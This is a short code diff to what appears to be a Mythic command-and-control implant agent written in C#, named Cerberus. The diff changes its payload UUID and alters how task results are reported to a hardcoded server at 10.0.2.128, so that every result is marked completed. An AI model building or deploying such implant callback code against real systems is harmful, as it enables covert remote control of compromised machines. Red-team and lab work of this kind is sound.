@@ -24,7 +24,7 @@ namespace Cerberus
 
         private static string serverAddress = "10.0.2.128";
         private static int serverPort = 80;
-        private static string PayloadUUID = "abea69d4-1bad-48e2-b93b-93907275fe55";
+        private static string PayloadUUID = "54fe5c8c-83c4-49b8-944d-5ef28d66a622";
         private static string UUID = "";
         private string killdate = "";
 
@@ -101,16 +101,16 @@ namespace Cerberus
 
         private static void SendTaskResult(MythicTask task, string result)
         {
-            if (!task.completed)
+/*            if (!task.completed)
             {
                 return;
-            }
+            }*/
 
             var taskResult = new MythicTaskResult
             {
                 task_id = task.id,
                 user_output = result,
-                completed = task.completed,
+                completed = true //task.completed,
             };
 
             _commModule.SendData(taskResult);
